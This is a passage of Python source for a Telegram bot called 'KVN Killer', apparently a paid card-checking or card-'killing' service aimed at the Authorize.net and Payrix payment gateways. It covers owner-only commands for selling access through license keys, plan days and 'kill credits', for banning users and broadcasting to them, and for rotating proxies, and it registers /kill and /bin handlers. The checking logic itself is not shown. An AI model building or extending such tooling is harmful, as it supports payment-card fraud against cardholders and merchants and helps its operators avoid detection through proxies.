async def del_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if not context.args:
        await update.message.reply_text(
            f"Usage: <code>/delproxy &lt;index&gt;</code>", parse_mode=ParseMode.HTML)
        return
    try:
        idx = int(context.args[0])
        if await proxy_pool.delete_by_index(idx):
            await update.message.reply_text(f"{ce('✅')} Proxy at index {idx} deleted.")
        else:
            await update.message.reply_text(f"{ce('❌')} Invalid index.")
    except ValueError:
        await update.message.reply_text("Index must be a number.")

async def addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if len(context.args) != 2:
        await update.message.reply_text(
            f"Usage: <code>/addcredits user_id amount</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
        if amount <= 0:
            await update.message.reply_text("Amount must be positive.")
            return
        db.ensure_user(target_id)
        db.add_kill_credits(target_id, amount)
        await update.message.reply_text(
            f"{ce('✅')} Added <b>{amount}</b> credits to <code>{target_id}</code>",
            parse_mode=ParseMode.HTML)
        try:
            await context.bot.send_message(target_id,
                f"{ce('💰')} <b>{amount}</b> kill credits added to your account!",
                parse_mode=ParseMode.HTML)
        except:
            pass
    except ValueError:
        await update.message.reply_text("Invalid args.")

async def credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = db.get_credits(user_id)
    e_money = ce('💰')
    title_str = f"{e_money} CREDITS {e_money}"
    title = box_title(title_str)
    await update.message.reply_text(
        f"{title}\n\n"
        f"╭─❲ 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 ❳\n"
        f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{credits}</code>\n"
        f"╰───────────",
        parse_mode=ParseMode.HTML)

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: <code>/ban user_id</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        db.ensure_user(target)
        db.ban(target)
        await update.message.reply_text(f"🚫 Banned <code>{target}</code>", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("Invalid user_id.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: <code>/unban user_id</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        db.unban(target)
        await update.message.reply_text(f"{ce('✅')} Unbanned <code>{target}</code>", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("Invalid user_id.")

async def grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: <code>/grant user_id days</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target, days = int(context.args[0]), int(context.args[1])
        db.ensure_user(target)
        db.add_plan_days(target, days)
        await update.message.reply_text(
            f"{ce('✅')} Granted <b>{days}</b> days to <code>{target}</code>",
            parse_mode=ParseMode.HTML)
        try:
            await context.bot.send_message(target,
                f"{ce('👑')} <b>{days}</b> days added to your plan!",
                parse_mode=ParseMode.HTML)
        except:
            pass
    except ValueError:
        await update.message.reply_text("Invalid args.")

async def grantkiller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if len(context.args) != 2:
        await update.message.reply_text(
            f"Usage: <code>/grantkiller user_id credits</code>", parse_mode=ParseMode.HTML)
        return
    try:
        target, creds = int(context.args[0]), int(context.args[1])
        db.ensure_user(target)
        db.add_kill_credits(target, creds)
        await update.message.reply_text(
            f"{ce('✅')} Granted <b>{creds}</b> kill credits to <code>{target}</code>",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("Invalid args.")

async def keygen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if len(context.args) < 1:
        await update.message.reply_text(
            f"Usage: <code>/keygen days [count]</code>", parse_mode=ParseMode.HTML)
        return
    try:
        days = int(context.args[0])
        count = int(context.args[1]) if len(context.args) > 1 else 1
        count = min(count, 50)
        keys = [db.gen_key(days) for _ in range(count)]
        await update.message.reply_text(
            f"🔑 Generated <b>{count}</b> key(s) — <b>{days}</b> days each:\n\n<code>" +
            "\n".join(keys) + "</code>",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("Invalid args.")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: <code>/redeem KEY</code>", parse_mode=ParseMode.HTML)
        return
    key = context.args[0].strip()
    days = db.redeem_key(key, update.effective_user.id)
    if days:
        user = db.get_user(update.effective_user.id)
        e_ok = ce('✅')
        e_clock = ce('⏰')
        e_fire = ce('🔥')
        title_str = f"{e_ok} KEY REDEEMED {e_ok}"
        title = box_title(title_str)
        await update.message.reply_text(
            f"{title}\n\n"
            f"╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n"
            f"├» 📅 𝗗𝗮𝘆𝘀: <b>{days}</b>\n"
            f"├» {e_clock} 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: <code>{user.plan_expiry[:10] if user.plan_expiry else 'N/A'}</code>\n"
            f"╰───────────\n\n"
            f"{e_fire} Unlimited access while active!",
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"{ce('❌')} Invalid or already redeemed key.")

async def banlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
    rows = db._exec("SELECT user_id, username FROM users WHERE is_banned = 1")
    title_str = "🚫 BANLIST 🚫"
    title = box_title(title_str)
    if not rows:
        await update.message.reply_text("No banned users.")
        return
    msg = f"{title}\n\n╭─❲ 𝗕𝗔𝗡𝗡𝗘𝗗 ❳\n"
    for r in rows:
        msg += f"├» <code>{r[0]}</code> — {r[1] or 'N/A'}\n"
    msg += "╰───────────"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: <code>/broadcast your message</code>", parse_mode=ParseMode.HTML)
        return
    message = " ".join(context.args)
    rows = db._exec("SELECT user_id FROM users WHERE is_banned = 0")
    sent, failed = 0, 0
    
    e_ok = ce('✅')
    e_no = ce('❌')
    
    progress = await update.message.reply_text(
        f"📢 Broadcasting to {len(rows)} users...\n{e_ok} {sent} | {e_no} {failed}",
        parse_mode=ParseMode.HTML)
    for row in rows:
        try:
            await context.bot.send_message(row[0],
                f"📢 <b>BROADCAST</b>\n\n{message}", parse_mode=ParseMode.HTML)
            sent += 1
        except (Forbidden, BadRequest):
            failed += 1
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
            try:
                await context.bot.send_message(row[0],
                    f"📢 <b>BROADCAST</b>\n\n{message}", parse_mode=ParseMode.HTML)
                sent += 1
            except:
                failed += 1
        if (sent + failed) % 10 == 0:
            try:
                await progress.edit_text(
                    f"📢 Broadcasting to {len(rows)} users...\n{e_ok} {sent} | {e_no} {failed}",
                    parse_mode=ParseMode.HTML)
            except:
                pass
        await asyncio.sleep(0.05)
        
    title_str = "📢 BROADCAST DONE 📢"
    title = box_title(title_str)
    await progress.edit_text(
        f"{title}\n\n"
        f"╭─❲ 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 ❳\n"
        f"├» {e_ok} 𝗦𝗲𝗻𝘁: <code>{sent}</code>\n"
        f"├» {e_no} 𝗙𝗮𝗶𝗹𝗲𝗱: <code>{failed}</code>\n"
        f"├» 👥 𝗧𝗼𝘁𝗮𝗹: <code>{len(rows)}</code>\n"
        f"╰───────────",
        parse_mode=ParseMode.HTML)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    s = db.get_stats()
    active_u = db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 0")[0][0]
    banned_u = db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 1")[0][0]
    with_plan = db._exec("SELECT COUNT(*) FROM users WHERE plan_expiry IS NOT NULL AND plan_expiry > ?",
                         (datetime.now().isoformat(),))[0][0]
    total_kills = s["kills"]
    total_credits = db._exec("SELECT SUM(kill_credits) FROM users")[0][0] or 0
    pa = await proxy_pool.count_active()
    pt = await proxy_pool.count_total()
    
    e_ok = ce('✅')
    e_crown = ce('👑')
    e_heart = ce('💔')
    e_money = ce('💰')
    
    title_str = "📊 BOT STATS 📊"
    title = box_title(title_str)
    
    await update.message.reply_text(
        f"{title}\n\n"
        f"╭─❲ 𝗨𝗦𝗘𝗥𝗦 ❳\n"
        f"├» 👥 𝗧𝗼𝘁𝗮𝗹: <code>{s['users']}</code>\n"
        f"├» {e_ok} 𝗔𝗰𝘁𝗶𝘃𝗲: <code>{active_u}</code>\n"
        f"├» 🚫 𝗕𝗮𝗻𝗻𝗲𝗱: <code>{banned_u}</code>\n"
        f"├» {e_crown} 𝗪𝗶𝘁𝗵 𝗣𝗹𝗮𝗻: <code>{with_plan}</code>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗦𝗬𝗦𝗧𝗘𝗠 ❳\n"
        f"├» {e_heart} 𝗧𝗼𝘁𝗮𝗹 𝗞𝗶𝗹𝗹𝘀: <code>{total_kills}</code>\n"
        f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{total_credits}</code>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 ❳\n"
        f"├» 🌐 𝗔𝗰𝘁𝗶𝘃𝗲: <code>{pa}/{pt}</code>\n"
        f"╰───────────",
        parse_mode=ParseMode.HTML)

async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    await proxy_pool.reload()
    count = await proxy_pool.count_active()
    title_str = "🔄 RELOADED 🔄"
    title = box_title(title_str)
    await update.message.reply_text(
        f"{title}\n\n"
        f"╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n"
        f"├» 🌐 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: <code>{count}</code>\n"
        f"╰───────────",
        parse_mode=ParseMode.HTML)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception: {context.error}", exc_info=context.error)

# ═══════════════════════════════════════
# HEALTH CHECK SERVER
# ═══════════════════════════════════════
async def health_check(request):
    return web.Response(text="OK", status=200)

def run_health_server():
    app_web = web.Application()
    app_web.router.add_get('/', health_check)
    app_web.router.add_get('/health', health_check)
    web.run_app(app_web, port=int(os.environ.get("PORT", 8080)))

# ═══════════════════════════════════════
# MAIN
# ═══════════════════════════════════════
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Core commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", start))
    app.add_handler(CommandHandler("help", start))

    # Kill command
    app.add_handler(CommandHandler("kill", kill))

    # Tool commands
    app.add_handler(CommandHandler("bin", bin_cmd))
    app.add_handler(CommandHandler("me", profile_cmd))
    app.add_handler(CommandHandler("id", id_cmd))

    # User commands
    app.add_handler(CommandHandler("plan", plan_cmd))
    app.add_handler(CommandHandler("credits", credits_cmd))
    app.add_handler(CommandHandler("redeem", redeem))

    # Proxy commands
    app.add_handler(CommandHandler("proxy", add_proxy))
    app.add_handler(CommandHandler("proxies", list_proxies))
    app.add_handler(CommandHandler("delproxy", del_proxy))

    # Admin commands
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("banlist", banlist))
    app.add_handler(CommandHandler("grant", grant))
    app.add_handler(CommandHandler("grantkiller", grantkiller))
    app.add_handler(CommandHandler("addcredits", addcredits))
    app.add_handler(CommandHandler("keygen", keygen))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("reload", reload_cmd))

    # Callback handler
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    logger.info("═══════════════════════════════════════")
    logger.info(f"  ⚡ KVN Killer v{VERSION} — {CODENAME}")
    logger.info("  UI Overhaul · Prince Checker Style")
    logger.info("  Authorize.net + Payrix")
    logger.info("═══════════════════════════════════════")

    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    port = os.environ.get("PORT")
    if port:
        threading.Thread(target=run_health_server, daemon=True).start()
    logger.info(f"Starting KVN Killer v{VERSION} {CODENAME}...")
    main()
